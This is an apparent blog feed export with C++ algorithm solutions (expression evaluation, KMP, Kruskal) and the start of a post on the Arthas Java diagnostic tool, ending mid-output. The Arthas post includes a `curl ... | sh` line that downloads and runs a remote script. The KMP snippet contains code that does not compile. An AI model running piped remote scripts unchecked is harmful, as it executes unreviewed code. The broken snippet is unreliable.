<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    </span><br><span class="line">map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; sym;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sym.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&#x27;+&#x27;</span>,<span class="number">1</span>));</span><br><span class="line">    sym.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&#x27;-&#x27;</span>,<span class="number">1</span>));</span><br><span class="line">    sym.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&#x27;*&#x27;</span>,<span class="number">2</span>));</span><br><span class="line">    sym.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&#x27;/&#x27;</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isInt</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">calc</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b, <span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span>) <span class="keyword">return</span> a+b;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;-&#x27;</span>) <span class="keyword">return</span> b-a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;*&#x27;</span>) <span class="keyword">return</span> b*a;</span><br><span class="line">    <span class="keyword">return</span> b/a;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string ss;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="type">int</span> kase = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; ss)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Case #&quot;</span> &lt;&lt; kase++ &lt;&lt; <span class="string">&quot;:&quot;</span>  &lt;&lt; endl;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; last;</span><br><span class="line">        stack&lt;<span class="type">double</span>&gt; answer;</span><br><span class="line">        <span class="type">int</span> qsize = ss.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; qsize; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isInt</span>(ss[i]))&#123; <span class="comment">/// num is the true num</span></span><br><span class="line">                <span class="type">double</span> num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(<span class="built_in">isInt</span>(ss[i]))&#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + ss[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> point = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(ss[i] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    ++i;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(<span class="built_in">isInt</span>(ss[i]))&#123;</span><br><span class="line">                        num = num * <span class="number">10</span> + ss[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                        ++i;    ++point;</span><br><span class="line">                    &#125;</span><br><span class="line">                    --i;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; point; ++j)&#123;</span><br><span class="line">                        num /= <span class="number">10.0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> --i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.*lf &quot;</span>, point, num);</span><br><span class="line">                answer.<span class="built_in">push</span>(num);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (last.<span class="built_in">empty</span>() || ss[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                last.<span class="built_in">push</span>(ss[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(ss[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(last.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">///calculate the num</span></span><br><span class="line">                        <span class="type">double</span> a = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="type">double</span> b = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">                        answer.<span class="built_in">push</span>(<span class="built_in">calc</span>(a,b, last.<span class="built_in">top</span>()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        <span class="comment">///epichar</span></span><br><span class="line">                    cout &lt;&lt; last.<span class="built_in">top</span>();</span><br><span class="line">                    last.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                last.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(!last.<span class="built_in">empty</span>() &amp;&amp; sym[ss[i]] &lt;= sym[last.<span class="built_in">top</span>()])&#123;</span><br><span class="line">                    <span class="type">double</span> a = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">                    <span class="type">double</span> b = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">                    answer.<span class="built_in">push</span>(<span class="built_in">calc</span>(a,b, last.<span class="built_in">top</span>()));</span><br><span class="line"></span><br><span class="line">                    cout &lt;&lt; last.<span class="built_in">top</span>();</span><br><span class="line">                    last.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                last.<span class="built_in">push</span>(ss[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!last.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">double</span> a = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">double</span> b = answer.<span class="built_in">top</span>(); answer.<span class="built_in">pop</span>();</span><br><span class="line">            answer.<span class="built_in">push</span>(<span class="built_in">calc</span>(a,b, last.<span class="built_in">top</span>()));</span><br><span class="line"></span><br><span class="line">            cout &lt;&lt; last.<span class="built_in">top</span>();</span><br><span class="line">            last.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;The answer is &quot;</span>;</span><br><span class="line">        <span class="type">double</span> ans = answer.<span class="built_in">top</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%g&quot;</span>,ans);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt;endl &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**************************************************************</span></span><br><span class="line"><span class="comment">    Language: C++</span></span><br><span class="line"><span class="comment">    Result: Accepted</span></span><br><span class="line"><span class="comment">    Time:1668 ms</span></span><br><span class="line"><span class="comment">    Memory:1296 kb</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><h2 id="How-to-calc-the-next-array"><a href="#How-to-calc-the-next-array" class="headerlink" title="How to calc the next array."></a>How to calc the next array.</h2><ol>
<li><p>Calc the max length of suffix and prefix as follows:</p>
<table>
<thead>
<tr>
<th>string</th>
<th>a</th>
<th>b</th>
<th>a</th>
<th>a</th>
<th>b</th>
<th>c</th>
<th>a</th>
<th>b</th>
<th>a</th>
</tr>
</thead>
<tbody><tr>
<td>length</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>next</td>
<td>-1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
<td>1</td>
<td>2</td>
</tr>
</tbody></table>
<p>As you can see, the next array is the <strong>suffix equals prefix length array</strong> move on one step and init the first values as -1.</p>
</li>
</ol>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNext</span><span class="params">(<span class="type">char</span>* p,<span class="type">int</span> next[])</span>  </span></span><br><span class="line"><span class="function">  </span>&#123;  </span><br><span class="line">      next[<span class="number">0</span>] = <span class="number">-1</span>;  </span><br><span class="line">      <span class="type">int</span> k = <span class="number">-1</span>,  = <span class="number">0</span>;  </span><br><span class="line">      <span class="keyword">while</span> (j &lt; (p.length - <span class="number">1</span>)) &#123;  </span><br><span class="line">          <span class="comment">//p[k]表示前缀，p[j]表示后缀  </span></span><br><span class="line">          <span class="keyword">if</span> (k == <span class="number">-1</span> || p[j] == p[k]) &#123;  </span><br><span class="line">              ++j, ++k, next[j] = k;  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">              k = next[k];  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;  </span><br></pre></td></tr></table></figure></div>



<h2 id="Kruskal"><a href="#Kruskal" class="headerlink" title="Kruskal"></a>Kruskal</h2><h2 id="在n个城市之间建设网络，只需保证连通即可，求最经济的架设方法。"><a href="#在n个城市之间建设网络，只需保证连通即可，求最经济的架设方法。" class="headerlink" title="在n个城市之间建设网络，只需保证连通即可，求最经济的架设方法。"></a>在n个城市之间建设网络，只需保证连通即可，求最经济的架设方法。</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><ul>
<li>有多组输入数据。每组第一行输入三个整数n、m、c（1&lt;&#x3D;n,m,c&lt;&#x3D;100000），分别代表城市数量，可建道路数量和单位长度道路修建费用。接下来m行每行三个整数u、v(1&lt;&#x3D;u,v&lt;&#x3D;n)、d(1&lt;&#x3D;d&lt;&#x3D;100000)。代表可建道路的起点城市、终点城市和长度。</li>
</ul>
<h3 id="output"><a href="#output" class="headerlink" title="output"></a>output</h3><ul>
<li>每组数据输出一行，输出数据组数和使所有城市连通的最小费用，无法全部连通输出-1。</li>
</ul>
<h4 id="Kruskal算法的步骤："><a href="#Kruskal算法的步骤：" class="headerlink" title="Kruskal算法的步骤："></a><strong>Kruskal算法的步骤：</strong></h4><p>1.对所有边进行从小到大的排序。 2.每次选一条边（最小的边），如果如果形成环，就不加入(u,v)中，否则加入。那么加入的(u,v)一定是最佳的。</p>
<h4 id="并查集解决，略微优化：路径压缩"><a href="#并查集解决，略微优化：路径压缩" class="headerlink" title="并查集解决，略微优化：路径压缩"></a><strong>并查集解决，略微优化：路径压缩</strong></h4><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">///Kruskal算法的步骤：</span></span><br><span class="line"><span class="comment">///1.对所有边进行从小到大的排序。</span></span><br><span class="line"><span class="comment">///2.每次选一条边（最小的边），如果如果形成环，就不加入(u,v)中，否则加入。</span></span><br><span class="line"><span class="comment">///那么加入的(u,v)一定是最佳的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///构成环的条件就是u，v已经连通，则不能添加</span></span><br><span class="line"><span class="comment">///关于这一点可用并查集查掌门解决</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> beg;</span><br><span class="line">    <span class="type">int</span> las;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">Node node[<span class="number">10200</span>];</span><br><span class="line"><span class="type">int</span> prev[<span class="number">10200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(Node a, Node b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">finds</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> r = x;</span><br><span class="line">    <span class="keyword">while</span>(prev[r] != r)&#123;</span><br><span class="line">        r = prev[r];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">join</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> fx = <span class="built_in">finds</span>(x), fy = <span class="built_in">finds</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">        prev[fx] = fy;<span class="comment">///fx != fy,即无共同顶点，不构成三点环</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> cases;  cin &gt;&gt; cases;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> kase = <span class="number">1</span>; kase &lt;= cases; ++kase)&#123;</span><br><span class="line">        <span class="type">int</span> n, m, c, sum = <span class="number">0</span>, tree = <span class="number">0</span>;</span><br><span class="line">        cin &gt;&gt; n &gt;&gt; m &gt;&gt; c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            prev[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="type">int</span> u, v, d;</span><br><span class="line">            cin &gt;&gt; node[i].beg &gt;&gt; node[i].las &gt;&gt; node[i].len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(node, node + m, cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">join</span>(node[i].beg, node[i].las))&#123;</span><br><span class="line">               sum += node[i].len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(prev[i] == i)&#123;</span><br><span class="line">                tree++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Case #&quot;</span> &lt;&lt; kase &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(tree &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; sum*c;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt; 傻逼的爆了一堆超时，二次弱逼式优化</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> beg;</span><br><span class="line">    <span class="type">int</span> las;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">&#125;node[<span class="number">100100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> prevs[<span class="number">100100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> Node &amp;a, <span class="type">const</span> Node &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">finds</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> r = x;</span><br><span class="line">    <span class="keyword">while</span>(prevs[r] != r)&#123;</span><br><span class="line">        r = prevs[r];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> t = x;</span><br><span class="line">    <span class="keyword">while</span>(t != r)&#123;</span><br><span class="line">        <span class="type">int</span> tf = prevs[t];</span><br><span class="line">        prevs[t] = r;</span><br><span class="line">        t = tf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">join</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> fx = <span class="built_in">finds</span>(x), fy = <span class="built_in">finds</span>(y);</span><br><span class="line">    <span class="keyword">if</span>(fx != fy)&#123;</span><br><span class="line">        prevs[fx] = fy;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> cases;  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;cases);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> kase = <span class="number">1</span>; kase &lt;= cases; ++kase)&#123;</span><br><span class="line">        <span class="type">int</span> n, m, c, sides = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;c);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">                prevs[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;node[i].beg, &amp;node[i].las, &amp;node[i].len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(node, node + m, cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">join</span>(node[i].beg, node[i].las))&#123;</span><br><span class="line">               sum += node[i].len;</span><br><span class="line">               sides++;</span><br><span class="line">               <span class="keyword">if</span>(sides == n<span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case #%d: &quot;</span>, kase);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sides == n<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,sum*c);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>Math</tag>
        <tag>Tips</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas</title>
    <url>/2021/10/19/arthas/</url>
    <content><![CDATA[<h3 id="下载启动"><a href="#下载启动" class="headerlink" title="下载启动"></a>下载启动</h3><p><code>curl -L https://arthas.aliyun.com/install.sh | sh</code> &amp;&amp; <code>./as.sh</code></p>
<h3 id="如何查看一个map里指定的key"><a href="#如何查看一个map里指定的key" class="headerlink" title="如何查看一个map里指定的key"></a>如何查看一个map里指定的key</h3><p><code>getstatic com.bj58.bic.ep.rankreview.web.common.Constant MAP_EMP_INFO &#39;entrySet().iterator.&#123;? #this.key==&quot;userName&quot;&#125;&#39;</code></p>
<p>坑： <code>ognl &#39;@com.envisioniot.enos.iot_log_sdk.core.ESClient@defaultESClient&#39;</code> 不生效</p>
<p>ognl命令默认只会去 SystemClassLoader 里找类。 getstatic 命令会直接找所有JVM里加载的类，而tomcat的classloader是自己的， 所以只有 getstatic 命令能找到。 ognl 命令要显式指定classloader 。</p>
<h3 id="获取-context-的-classloader"><a href="#获取-context-的-classloader" class="headerlink" title="获取 context 的  classloader"></a>获取 context 的  classloader</h3><p><code>getstatic com.bj58.bic.ep.rankreview.web.component.SpringContextConfig applicationContext</code></p>
<p>翻到最下面可以看到是 <code>org.apache.catalina.loader.ParallelWebappClassLoader</code></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">getstatic com.bj58.bic.ep.rankreview.web.component.SpringContextConfig applicationContext</span></span><br><span class="line">field: applicationContext</span><br><span class="line">@FileSystemXmlApplicationContext[</span><br><span class="line">    validating=@Boolean[true],</span><br><span class="line">    configLocations=@String[][isEmpty=false;size=1],</span><br><span class="line">    setIdCalled=@Boolean[false],</span><br><span class="line">    allowBeanDefinitionOverriding=null,    allowCircularReferences=null,</span><br><span class="line">    beanFactory=@DefaultListableBeanFactory[org.springframework.beans.factory.support.DefaultListableBeanFactory@4b599b1a: defining beans [caffeineLocalCacheClient,initParams,operateLogAspect,appConfig,kmsClient,springContextConfig,wosClient,synEmployeeLocalCacheJob,judgeHRLeaderReviewsEmailServiceImpl,matchRuleTryCalcMatchServiceImpl,matchRuleTryCalcServiceImpl,ruleLimitCountMatchService,ruleLimitGroupMatchService,reviewsAllocService,AbstractReviewsAutoAllocP,AbstractReviewsAutoAllocT,agentServiceImpl,basicAttendSettingServiceImpl,basicConfigServiceImpl,basicJudgeGroupServiceImpl,constantValServiceImpl,contributionServiceImpl,departmentServiceImpl,directionAdminServiceImpl,emailNoticeTimingServiceImpl,evaluationJudgeServiceImpl,evaluationStatusServiceImpl,eventTriggerServiceImpl,finalResultServiceImpl,HRBPAuthServiceImpl,judgeGroupDirectionServiceImpl,judgeGroupMetaServiceImpl,judgePlacementServiceImpl,matchRuleServiceImpl,myTourServiceImpl,OAProcessServiceImpl,participantOperateServiceImpl,participantScheduleServiceImpl,plusParticipantServiceImpl,rankInfoServiceImpl,rankMetaServiceImpl,reportContentServiceImpl,reportReceiverServiceImpl,reportServiceImpl,reviewCalendarServiceImpl,reviewSessionHrServiceImpl,reviewsDirectionServiceImpl,reviewsEvaluateServiceImpl,reviewsJudgeManageServiceImpl,reviewsJudgeServiceImpl,reviewsJudgeStatementVersionServiceImpl,reviewsLessonServiceImpl,reviewsRuleServiceImpl,reviewsSessionAllocConfigServiceImpl,reviewsSessionCheckServiceImpl,reviewsSessionJudgeRelServiceImpl,reviewsSessionParticipantRelServiceImpl,reviewsSessionServiceImpl,reviewsSessionV2ServiceImpl,reviewsSessionWaiterServiceImpl,reviewsVersionServiceImpl,ruleDictServiceImpl,scoreBakServiceImpl,scoreCriteriaServiceImpl,scoreDescServiceImpl,sendEmailServiceImpl,siteMessageServiceImpl,staffEncryptDecryptServiceImpl,staffEvaluationServiceImpl,staffManageServiceimpl,staffStatisticsServiceImpl,staffStatusServiceImpl,syncInfoServiceImpl,sysPermissionServiceImpl,sysRolePermissionServiceImpl,sysRoleServiceImpl,sysUserRoleServiceImpl,userOccupiedBlockServiceImpl,userSiteMessageServiceImpl,valueObjectService,versionAuthRangeImpl,versionRuleServiceImpl,exportTemplate,org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,org.springframework.context.event.internalEventListenerProcessor,org.springframework.context.event.internalEventListenerFactory,org.springframework.context.annotation.internalAsyncAnnotationProcessor,org.springframework.context.annotation.internalScheduledAnnotationProcessor,placeholderConfigurer,beatContext,validator,bindAndValidate,org.springframework.aop.config.internalAutoProxyCreator,jedisPoolConfig,jedisPool,jedisHelper,org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration,org.springframework.transaction.config.internalTransactionAdvisor,transactionAttributeSource,transactionInterceptor,org.springframework.transaction.config.internalTransactionalEventListenerFactory,sqlSessionFactory,transactionManager,getDataSource,agentMapper,baseMapper,basicAttendSettingMapper,basicConfigJudgeGroupMapper,basicConfigJudgeParticipantMapper,basicConfigJudgeSchemaMapper,basicConfigOrgSubjectMapper,basicConfigReviewTimeMapper,basicConfigRoomMapper,basicConfigSpecialApplyMapper,contributionMapper,departmentMapper,directionAdminMapper,emailNoticeTimingMapper,evaluationJudgeMapper,evaluationStatusMapper,eventTriggerMapper,finalResultMapper,HRBPAuthMapper,judgeGroupDirectionMapper,judgeGroupMetaMapper,languageMapper,matchRuleGroupMapper,matchRuleMetaMapper,participantFlowMapper,participantMapper,plusParticipantMapper,rankInfoMapper,rankMetaMapper,rankReviewYearsRuleMapper,reportContentMapper,reportReceiverMapper,reviewCalendarMapper,reviewDirectionMapper,reviewRuleMapper,reviewSessionHrMapper,reviewsJudgeManageMapper,reviewsJudgeMapper,reviewsJudgeStatementVersionMapper,reviewsLessonMapper,reviewsSessionAllocConfigMapper,reviewsSessionJudgeRelMapper,reviewsSessionMapper,reviewsSessionParticipantRelMapper,reviewsVersionMapper,ruleDictMapper,scoreBakMapper,scoreDescriptionMapper,scoreElementMapper,siteMessageMapper,staffCountMapper,staffEvaluationMapper,staffStatisticsMapper,staffStatusMapper,syncInfoMapper,sysPermissionMapper,sysRoleMapper,sysRolePermissionMapper,sysUserRoleMapper,userOccupiedBlockMapper,userSiteMessageMapper,valueObjectMapper,versionAuthRangeMapper,versionRuleMapper,org.springframework.scheduling.annotation.SchedulingConfiguration]; root of factory hierarchy],</span><br><span class="line">    beanFactoryMonitor=@Object[java.lang.Object@2d19c93f],</span><br><span class="line">    MESSAGE_SOURCE_BEAN_NAME=@String[messageSource],</span><br><span class="line">    LIFECYCLE_PROCESSOR_BEAN_NAME=@String[lifecycleProcessor],</span><br><span class="line">    APPLICATION_EVENT_MULTICASTER_BEAN_NAME=@String[applicationEventMulticaster],</span><br><span class="line">    logger=@Log4JLogger[org.apache.commons.logging.impl.Log4JLogger@52743f1f],</span><br><span class="line">    id=@String[org.springframework.context.support.FileSystemXmlApplicationContext@48ed680],</span><br><span class="line">    displayName=@String[org.springframework.context.support.FileSystemXmlApplicationContext@48ed680],</span><br><span class="line">    parent=null,</span><br><span class="line">    environment=@StandardEnvironment[StandardEnvironment &#123;activeProfiles=[], defaultProfiles=[default], propertySources=[MapPropertySource &#123;name=&#x27;systemProperties&#x27;&#125;, SystemEnvironmentPropertySource &#123;name=&#x27;systemEnvironment&#x27;&#125;]&#125;],</span><br><span class="line">    beanFactoryPostProcessors=@ArrayList[isEmpty=true;size=0],</span><br><span class="line">    startupDate=@Long[1636450003372],</span><br><span class="line">    active=@AtomicBoolean[true],</span><br><span class="line">    closed=@AtomicBoolean[false],</span><br><span class="line">    startupShutdownMonitor=@Object[java.lang.Object@4838b5cd],</span><br><span class="line">    